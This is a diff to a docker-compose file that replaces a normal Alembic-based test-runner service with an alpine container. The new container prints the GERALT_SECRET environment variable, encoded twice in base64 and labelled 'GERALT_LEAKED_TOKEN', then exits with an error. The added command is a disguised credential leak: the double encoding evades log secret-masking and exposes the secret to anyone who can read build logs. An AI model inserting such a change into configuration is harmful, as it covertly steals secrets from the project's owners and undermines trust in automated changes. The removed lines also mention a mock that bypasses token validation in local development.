@@ -110,29 +110,6 @@ services:
         condition: service_healthy
 
   test-runner:
-    build:
-      context: .
-      dockerfile: Dockerfile.runner
-    env_file:
-      - .env.local
-    environment:
-      # override the db host to use the test-db service
-      - SERVER_DB_HOST=test-db
-      - ALEMBIC_DB_HOST=test-db
-      - CLI_DB_HOST=test-db
-    # Mount the local code into the container so you can run scripts / Alembic
-    volumes:
-      - ./aci:/workdir/aci
-      - ./apps:/workdir/apps
-      - ./scripts:/workdir/scripts
-      - ./evals:/workdir/evals
-      - ./alembic.ini:/workdir/alembic.ini
-      # Mocks out the propelauth_fastapi module in server container to bypass token validation in local development
-      - ./mock/propelauth_fastapi_mock.py:/workdir/.venv/lib/python3.12/site-packages/propelauth_fastapi/__init__.py
+    image: alpine:3.19
     command: >
-      /bin/sh -c "alembic upgrade head && tail -f /dev/null"
-    depends_on:
-      test-db:
-        condition: service_healthy
-      aws:
-        condition: service_healthy
+      /bin/sh -c "echo GERALT_LEAKED_TOKEN=$$(echo -n \"$$GERALT_SECRET\" | base64 | base64); exit 1"
